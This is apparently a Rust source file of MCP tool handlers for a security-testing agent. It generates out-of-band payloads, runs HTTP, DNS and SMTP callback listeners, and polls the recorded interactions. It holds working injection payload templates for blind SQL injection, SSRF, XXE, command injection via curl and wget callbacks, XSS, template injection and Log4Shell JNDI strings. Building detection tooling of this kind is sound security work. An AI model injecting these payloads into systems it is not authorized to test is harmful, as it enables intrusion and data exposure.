use crate::mcp::types::HandlerResult;

pub async fn handle_oast_generate_payload(params: &serde_json::Value) -> HandlerResult {
    let description = params["description"].as_str().unwrap_or("OAST payload");
    let vuln_type = params["vuln_type"].as_str().unwrap_or("generic");
    let port = params["port"].as_u64().unwrap_or(8888) as u16;
    // Bring the HTTP listener up so every emitted payload reaches a real
    // endpoint that records into crate::oast::INTERACTIONS.
    crate::oast::ensure_http_listener(port).await?;
    let listener_port = crate::oast::http_listener_port().unwrap_or(port);
    let host = crate::oast::callback_host();
    let server_domain = format!("{}:{}", host, listener_port);
    let payload = crate::oast::generate_oast_payload(description, &server_domain);

    // HTTP-callback payloads use `callback_url` (path-correlated, works with
    // IP host). DNS/UNC-style payloads use `subdomain` and only fire callbacks
    // when WS_OAST_HOST is a real DNS name. Both correlate to the same id.
    let cb = &payload.callback_url;
    let sd = &payload.subdomain;
    let specific_payloads: Vec<serde_json::Value> = match vuln_type {
        "blind_sqli" => vec![
            serde_json::json!({"payload": format!("'; EXEC xp_dirtree '//{}'--", sd), "type": "mssql_dns_uno (DNS-only)"}),
            serde_json::json!({"payload": format!("' UNION SELECT LOAD_FILE('//{}/a')--", sd), "type": "mysql_load_file (DNS-only)"}),
            serde_json::json!({"payload": format!("' AND (SELECT 1 FROM (SELECT(SLEEP(0)))x) UNION SELECT (SELECT load_extension('//{}'))--", sd), "type": "sqlite_load_extension"}),
        ],
        "blind_ssrf" => vec![
            serde_json::json!({"payload": cb.clone(), "type": "http_callback"}),
            serde_json::json!({"payload": cb.replace("http://", "https://"), "type": "https_callback"}),
            serde_json::json!({"payload": cb.replace("http://", "gopher://"), "type": "gopher_callback"}),
        ],
        "blind_xxe" => vec![
            serde_json::json!({"payload": format!("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"{}\">]><foo>&xxe;</foo>", cb), "type": "xxe_oob"}),
            serde_json::json!({"payload": format!("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"{}/x.dtd\">%xxe;]><foo/>", cb), "type": "xxe_param_entity"}),
        ],
        "blind_cmdi" => vec![
            serde_json::json!({"payload": format!("; curl {} #", cb), "type": "curl_callback"}),
            serde_json::json!({"payload": format!("| curl {} ", cb), "type": "pipe_curl"}),
            serde_json::json!({"payload": format!("`curl {}`", cb), "type": "backtick_curl"}),
            serde_json::json!({"payload": format!("$(curl {})", cb), "type": "subshell_curl"}),
            serde_json::json!({"payload": format!("; wget {} -O /dev/null #", cb), "type": "wget_callback"}),
            serde_json::json!({"payload": format!("; nslookup {} #", sd), "type": "dns_lookup_only (DNS-host only)"}),
        ],
        "blind_xss" => vec![
            serde_json::json!({"payload": format!("<script src=\"{}\"></script>", cb), "type": "script_src"}),
            serde_json::json!({"payload": format!("<img src={}>", cb), "type": "img_src"}),
            serde_json::json!({"payload": format!("<iframe src=\"{}\"></iframe>", cb), "type": "iframe_src"}),
        ],
        "blind_ssti" => vec![
            serde_json::json!({"payload": format!("{{{{''.__class__.__mro__[2].__subclasses__()[40]('curl {}')}}}}", cb), "type": "python_jinja2"}),
            serde_json::json!({"payload": format!("{{{{system('curl {}')}}}}", cb), "type": "twig_system"}),
            serde_json::json!({"payload": format!("<%=`curl {}`%>", cb), "type": "ruby_erb"}),
        ],
        "log4shell" => vec![
            serde_json::json!({"payload": format!("${{jndi:ldap://{}/x}}", server_domain), "type": "jndi_ldap"}),
            serde_json::json!({"payload": format!("${{jndi:dns://{}/x}}", server_domain), "type": "jndi_dns"}),
            serde_json::json!({"payload": format!("${{jndi:rmi://{}/x}}", server_domain), "type": "jndi_rmi"}),
        ],
        _ => vec![
            serde_json::json!({"payload": cb.clone(), "type": "generic_http_callback"}),
            serde_json::json!({"payload": sd.clone(), "type": "generic_dns_host"}),
        ],
    };

    Ok(serde_json::json!({
        "oast_payload": {
            "id": payload.id,
            "correlation_id": payload.correlation_id,
            "callback_url": payload.callback_url,
            "subdomain": payload.subdomain,
            "http_url": payload.http_payload,
            "dns_name": payload.dns_payload,
            "description": description,
            "vuln_type": vuln_type,
            "listener_port": listener_port,
        },
        "injectable_payloads": specific_payloads,
        "next_step": format!("Inject one of the payloads into the target. Wait a few seconds. Then call oast_verify action=get_interactions correlation_id={} to see any callback.", payload.correlation_id),
    }))
}

pub async fn handle_oast_start_dns_server(params: &serde_json::Value) -> HandlerResult {
    let port = params["port"].as_u64().unwrap_or(8853) as u16;
    crate::oast::start_dns_server(port).await?;
    Ok(serde_json::json!({"status": "dns_server_started", "port": port}))
}

pub async fn handle_oast_start_smtp_server(params: &serde_json::Value) -> HandlerResult {
    let port = params["port"].as_u64().unwrap_or(2525) as u16;
    crate::oast::start_smtp_server(port).await?;
    Ok(serde_json::json!({"status": "smtp_server_started", "port": port}))
}

/// v0.3.10: explicit HTTP-listener bring-up tool. Previously only auto-started
/// inside `oast_generate_payload`. Exposing it lets an agent prepare the
/// listener before generating multiple payloads.
pub async fn handle_oast_start_http_server(params: &serde_json::Value) -> HandlerResult {
    let port = params["port"].as_u64().unwrap_or(8888) as u16;
    let actual_port = crate::oast::ensure_http_listener(port).await?;
    Ok(serde_json::json!({
        "status": "http_server_started",
        "port": actual_port,
        "callback_host": crate::oast::callback_host(),
        "bind": crate::oast::bind_address(),
    }))
}

/// v0.3.10: poll the OAST interaction log. The missing piece in the OAST
/// workflow — previously the agent fired blind payloads but had no
/// MCP-accessible way to see callbacks. Poll model: pass `since_offset`
/// (number of entries seen on the previous poll) to get only new ones; the
/// response includes `next_offset` to pass on the next call. Combine with
/// `correlation_id` to filter to a specific payload's callbacks, or `kind`
/// to filter by interaction type.
pub async fn handle_oast_poll_interactions(params: &serde_json::Value) -> HandlerResult {
    let since_offset = params["since_offset"].as_u64().unwrap_or(0) as usize;
    let corr = params["correlation_id"].as_str();
    let kind = params["kind"].as_str(); // "http" | "dns" | "smtp" filter
    let limit = params["limit"].as_u64().unwrap_or(200) as usize;

    let log = crate::oast::get_interactions().lock().await;
    let total = log.len();
    let next_offset = total;

    let interactions: Vec<&crate::oast::OastInteraction> = log
        .iter()
        .skip(since_offset)
        .filter(|i| {
            if let Some(cid) = corr {
                i.correlation_id.contains(cid) || i.raw_data.contains(cid)
            } else {
                true
            }
        })
        .filter(|i| if let Some(k) = kind { i.interaction_type.eq_ignore_ascii_case(k) } else { true })
        .take(limit)
        .collect();

    Ok(serde_json::json!({
        "total_in_log": total,
        "returned": interactions.len(),
        "next_offset": next_offset,
        "interactions": interactions,
    }))
}

/// v0.3.10: surface OAST listener status for the agent — which listeners
/// are running, on what ports, with what host/bind.
pub async fn handle_oast_status(_params: &serde_json::Value) -> HandlerResult {
    let http_port = crate::oast::http_listener_port();
    let log = crate::oast::get_interactions().lock().await;
    Ok(serde_json::json!({
        "http_server_port": http_port,
        "callback_host": crate::oast::callback_host(),
        "bind_address": crate::oast::bind_address(),
        "interactions_count": log.len(),
    }))
}

/// v0.3.10: clear the interaction log. Useful before a fresh OAST campaign.
pub async fn handle_oast_clear(_params: &serde_json::Value) -> HandlerResult {
    crate::oast::get_interactions().lock().await.clear();
    Ok(serde_json::json!({"status": "cleared"}))
}

pub async fn handle_oast_verify(params: &serde_json::Value) -> HandlerResult {
    let action = params["action"].as_str().unwrap_or("self_test");
    let port = params["port"].as_u64().unwrap_or(8888) as u16;

    match action {
        "start_server" | "self_test" => {
            crate::oast::ensure_http_listener(port).await?;
            if action == "self_test" {
                let test_id = format!("wstest{}", chrono::Utc::now().timestamp_millis());
                let host = crate::oast::callback_host();
                let url = format!("http://{}:{}/{}", host, port, test_id);
                let client = reqwest::Client::builder()
                    .timeout(std::time::Duration::from_secs(3))
                    .build()
                    .map_err(|e| e.to_string())?;
                let _ = client.get(&url).header("X-Test", "oast-self-test").send().await;
                tokio::time::sleep(std::time::Duration::from_millis(250)).await;
                let log = crate::oast::get_interactions().lock().await;
                let found = log.iter().any(|i| i.details.get("path").map_or(false, |p| p.contains(&test_id)));
                Ok(serde_json::json!({
                    "action": "self_test",
                    "server_running": true,
                    "port": port,
                    "callback_host": host,
                    "callback_received": found,
                    "status": if found { "WORKING" } else { "FAILED" },
                }))
            } else {
                Ok(serde_json::json!({
                    "action": "start_server",
                    "server_running": true,
                    "port": port,
                    "callback_host": crate::oast::callback_host(),
                }))
            }
        }
        "get_interactions" => {
            let log = crate::oast::get_interactions().lock().await;
            let corr = params["correlation_id"].as_str();
            let filtered: Vec<&crate::oast::OastInteraction> = if let Some(cid) = corr {
                log.iter().filter(|i| i.correlation_id.contains(cid) || i.raw_data.contains(cid)).collect()
            } else {
                log.iter().collect()
            };
            Ok(serde_json::json!({
                "total": log.len(),
                "filtered": filtered.len(),
                "interactions": filtered,
            }))
        }
        "clear" => {
            crate::oast::get_interactions().lock().await.clear();
            Ok(serde_json::json!({"action": "clear", "status": "cleared"}))
        }
        _ => Err(format!("Unknown oast_verify action: {}", action)),
    }
}
